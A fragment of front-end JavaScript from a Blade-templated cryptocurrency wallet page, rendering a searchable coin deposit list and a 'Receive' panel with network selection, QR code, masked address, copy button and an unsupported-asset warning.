    var _dpClose    = document.getElementById('vb-deposit-close');
    var _rcPanel    = document.getElementById('vb-receive-panel');
    var _rcBack     = document.getElementById('vb-receive-back');
    var _rcTitle    = document.getElementById('vb-receive-title');
    var _rcSubtitle = document.getElementById('vb-receive-subtitle');

    function _buildDepositList(filter) {
      _dpList.innerHTML = '';
      var q = (filter || '').toLowerCase().trim();
      _state.coins.forEach(function(coin) {
        if (_explicitKeys.indexOf(coin.key) === -1 || !coin.addr) return;
        var def = _coinMap[coin.key];
        if (!def) return;
        if (q && def.name.toLowerCase().indexOf(q) < 0 && def.ticker.toLowerCase().indexOf(q) < 0) return;

        var row = document.createElement('div');
        row.className = 'vb-dp-coin-row';

        row.appendChild(_iconEl(def, 42));

        var mid = document.createElement('div');
        mid.style.cssText = 'flex:1;min-width:0;display:flex;flex-direction:column;gap:2px;';
        var nameEl = document.createElement('div');
        nameEl.style.cssText = 'font-size:16px;font-weight:600;color:#fff;';
        nameEl.textContent = def.name;
        var tickEl = document.createElement('div');
        tickEl.style.cssText = 'font-size:12px;color:rgb(138,145,158);';
        tickEl.textContent = def.ticker;
        mid.appendChild(nameEl); mid.appendChild(tickEl);
        row.appendChild(mid);

        var right = document.createElement('div');
        right.style.cssText = 'display:flex;flex-direction:column;align-items:flex-end;gap:2px;flex-shrink:0;';
        var price  = _livePrices[coin.key] || 0;
        var amt    = parseFloat(coin.amt) || 0;
        var usdEl2 = document.createElement('div');
        usdEl2.style.cssText = 'font-size:14px;font-weight:400;color:#fff;';
        usdEl2.textContent = (price && amt) ? _fmtUsd(amt * price) : '$0.00';
        var amtEl2 = document.createElement('div');
        amtEl2.style.cssText = 'font-size:12px;color:rgb(138,145,158);';
        amtEl2.textContent = amt ? (coin.amt + ' ' + def.ticker) : '0 ' + def.ticker;
        right.appendChild(usdEl2); right.appendChild(amtEl2);
        row.appendChild(right);
        var dpChev = document.createElement('span');
        dpChev.className = 'vb-row-chevron';
        dpChev.innerHTML = '<svg width="16" height="16" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><polyline points="9 18 15 12 9 6"/></svg>';
        row.appendChild(dpChev);

        row.addEventListener('click', function() { _openReceive(def, coin.addr); });
        _dpList.appendChild(row);
      });
    }

    function _openDeposit() {
      _beacon('deposit');
      _dpSearch.value = '';
      _buildDepositList('');
      _dpPanel.classList.add('open');
      document.body.style.overflow = 'hidden';
    }

    function _closeDeposit() {
      _dpPanel.classList.remove('open');
      _rcPanel.classList.remove('open');
      document.body.style.overflow = '';
    }

    // Network families for multi-network coins
    var _rcNetFamilies = {
      'usdt':        {family:['usdt','usdt_trc20'],        labels:{'usdt':'ERC-20 (Ethereum)','usdt_trc20':'TRC-20 (TRON)'}},
      'usdt_trc20':  {family:['usdt','usdt_trc20'],        labels:{'usdt':'ERC-20 (Ethereum)','usdt_trc20':'TRC-20 (TRON)'}},
      'usdc':        {family:['usdc','usdc_base','usdc_sol','usdc_polygon'],labels:{'usdc':'ERC-20 (Ethereum)','usdc_base':'Base (Base)','usdc_sol':'SPL (Solana)','usdc_polygon':'ERC-20 (Polygon)'}},
      'usdc_base':   {family:['usdc','usdc_base','usdc_sol','usdc_polygon'],labels:{'usdc':'ERC-20 (Ethereum)','usdc_base':'Base (Base)','usdc_sol':'SPL (Solana)','usdc_polygon':'ERC-20 (Polygon)'}},
      'usdc_sol':    {family:['usdc','usdc_base','usdc_sol','usdc_polygon'],labels:{'usdc':'ERC-20 (Ethereum)','usdc_base':'Base (Base)','usdc_sol':'SPL (Solana)','usdc_polygon':'ERC-20 (Polygon)'}},
      'usdc_polygon':{family:['usdc','usdc_base','usdc_sol','usdc_polygon'],labels:{'usdc':'ERC-20 (Ethereum)','usdc_base':'Base (Base)','usdc_sol':'SPL (Solana)','usdc_polygon':'ERC-20 (Polygon)'}},
    };

    var _rcNetRow  = document.getElementById('vb-receive-network-row');
    var _rcDetails = document.getElementById('vb-receive-details');
    var _rcBanner  = document.getElementById('vb-receive-banner');
    var _rcQr      = document.getElementById('vb-receive-qr');
    var _rcAddrSh  = document.getElementById('vb-receive-addr-short');
    var _rcEyeBtn  = document.getElementById('vb-receive-eye-btn');
    var _rcCopyBtn = document.getElementById('vb-receive-copy-btn');
    var _rcInfoEl  = document.getElementById('vb-receive-info-coin');

    function _showReceiveDetails(def, addr, networkLabel) {
      _rcSubtitle.textContent = networkLabel || ('on the ' + (NETWORK_NAMES[def.key] || def.name) + ' network');
      _rcDetails.style.display = 'block';
      if (_rcBanner) {
        _rcBanner.style.background = def.color || '#1a1d23';
        var _bc = document.getElementById('vb-receive-banner-coin');
        if (_bc) { _bc.innerHTML=''; _bc.style.background=def.color||'#333'; var _bi=document.createElement('img'); _bi.src=def.iconUrl||''; _bi.style.cssText='width:44px;height:44px;object-fit:cover;display:block;'; _bi.onerror=function(){_bi.style.display='none';var _bfb=document.createElement('div');_bfb.style.cssText='font-size:11px;font-weight:700;color:#fff;';_bfb.textContent=def.ticker.substring(0,4);_bc.appendChild(_bfb);}; _bc.appendChild(_bi); }
      }
      if (_rcQr) {
        _rcQr.innerHTML = '';
        if (addr && typeof QRCode !== 'undefined') {
          try { new QRCode(_rcQr, {text:addr,width:148,height:148,correctLevel:QRCode.CorrectLevel.H}); } catch(e) {}
        }
        if (addr && !_rcQr.children.length) {
          var qrImgEl = document.createElement('img');
          qrImgEl.src = QR_API + encodeURIComponent(addr);
          qrImgEl.width = 148;
          qrImgEl.height = 148;
          qrImgEl.alt = 'QR Code';
          qrImgEl.style.cssText = 'display:block;width:148px;height:148px;';
          _rcQr.appendChild(qrImgEl);
        }
      }
      var _addrVisible = false;
      if (_rcAddrSh) _rcAddrSh.textContent = addr ? (addr.slice(0,6)+'....'+addr.slice(-4)) : 'No address configured';
      if (_rcEyeBtn) {
        _rcEyeBtn.innerHTML = EYE_CLOSED;
        _rcEyeBtn.style.display = addr ? '' : 'none';
        _rcEyeBtn.onclick = function() {
          if (!addr) return; _addrVisible = !_addrVisible;
          _rcAddrSh.textContent = _addrVisible ? addr : (addr.slice(0,6)+'....'+addr.slice(-4));
          _rcAddrSh.style.whiteSpace = _addrVisible ? 'normal' : 'nowrap';
          _rcAddrSh.style.overflow = _addrVisible ? 'visible' : 'hidden';
          _rcAddrSh.style.textOverflow = _addrVisible ? 'clip' : 'ellipsis';
          _rcEyeBtn.innerHTML = _addrVisible ? EYE_OPEN : EYE_CLOSED;
        };
      }
      if (_rcCopyBtn) {
        _rcCopyBtn.innerHTML = '<svg width="18" height="18" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><rect x="9" y="9" width="13" height="13" rx="2"/><path d="M5 15H4a2 2 0 0 1-2-2V4a2 2 0 0 1 2-2h9a2 2 0 0 1 2 2v1"/></svg>';
        _rcCopyBtn.onclick = function() {
          if (!addr) return;
          navigator.clipboard.writeText(addr).then(function() {
            _rcCopyBtn.innerHTML = '<svg width="18" height="18" viewBox="0 0 24 24" fill="none" stroke="#4ade80" stroke-width="2.5" stroke-linecap="round" stroke-linejoin="round"><polyline points="20 6 9 17 4 12"/></svg>';
            setTimeout(function(){ _rcCopyBtn.innerHTML='<svg width="18" height="18" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><rect x="9" y="9" width="13" height="13" rx="2"/><path d="M5 15H4a2 2 0 0 1-2-2V4a2 2 0 0 1 2-2h9a2 2 0 0 1 2 2v1"/></svg>'; }, 1500);
          }).catch(function(){});
        };
      }
      if (_rcInfoEl) {
        var net = networkLabel || (NETWORK_NAMES[def.key] || def.name);
        _rcInfoEl.textContent = 'Do not send any other coins to this address. This address can only receive '+def.name+' ('+def.ticker+') on the '+net+' network. Sending unsupported assets may result in permanent loss.';
      }
    }

    function _openReceive(def, addr) {
      _rcTitle.textContent = 'Receive ' + def.name;
      _rcNetRow.innerHTML = '';
      var netDef = _rcNetFamilies[def.key];
      if (netDef) {
        _rcSubtitle.textContent = 'Select a network';
        _rcNetRow.style.display = 'flex';
        _rcDetails.style.display = 'none';
        netDef.family.forEach(function(nk) {
          var defNk = _coinMap[nk]; if (!defNk) return;
          var coinNk = _state.coins.filter(function(c){ return c.key === nk; })[0];
          var addrNk = coinNk ? (coinNk.addr||'') : (_d[nk+'_address']||'');
          if (!addrNk) return;
          var label = netDef.labels[nk];
          var btn = document.createElement('button');
          btn.style.cssText = 'display:flex;align-items:center;justify-content:space-between;width:100%;padding:14px 16px;background:transparent;border:1px solid rgba(138,145,158,.2);border-radius:8px;color:#fff;font-size:15px;font-weight:600;cursor:pointer;transition:background .12s,border-color .12s;text-align:left;';
          btn.onmouseover = function(){ btn.style.background='rgba(255,255,255,.11)'; btn.style.borderColor='rgba(255,255,255,.25)'; };
          btn.onmouseout  = function(){ btn.style.background='rgba(255,255,255,.06)'; btn.style.borderColor='rgba(255,255,255,.12)'; };
          var lblSpan = document.createElement('span'); lblSpan.textContent = label;
          var chev = document.createElement('span'); chev.innerHTML = '<svg width="16" height="16" viewBox="0 0 24 24" fill="none" stroke="rgba(255,255,255,.4)" stroke-width="2.5" stroke-linecap="round" stroke-linejoin="round"><polyline points="9 18 15 12 9 6"/></svg>';
          btn.appendChild(lblSpan); btn.appendChild(chev);
          (function(_dNk, _aNk, _lbl){ btn.addEventListener('click', function(){ _rcNetRow.style.display='none'; _showReceiveDetails(_dNk,_aNk,'on the '+_lbl+' network'); }); })(defNk, addrNk, label);
          _rcNetRow.appendChild(btn);
        });
      } else {
        _rcNetRow.style.display = 'none';
        _showReceiveDetails(def, addr);
      }
      _rcPanel.classList.add('open');
    }

    document.getElementById('vb-deposit-btn').addEventListener('click', _openDeposit);
    _dpClose.addEventListener('click', _closeDeposit);
    _rcBack.addEventListener('click', function() { _rcPanel.classList.remove('open'); });

    _dpSearch.addEventListener('input', function() { _buildDepositList(_dpSearch.value); });

    document.addEventListener('keydown', function(e) {
      if (e.key === 'Escape') {
        if (_wdFormPanel.classList.contains('open')) { _closeWithdrawForm(); }
        else if (_wdPanel.classList.contains('open')) { _closeWithdrawPanel(); }
        else if (_rcPanel.classList.contains('open')) { _rcPanel.classList.remove('open'); }
        else if (_dpPanel.classList.contains('open')) { _closeDeposit(); }
      }
    });
  })();
@endverbatim
  </script>
 </body>
</html>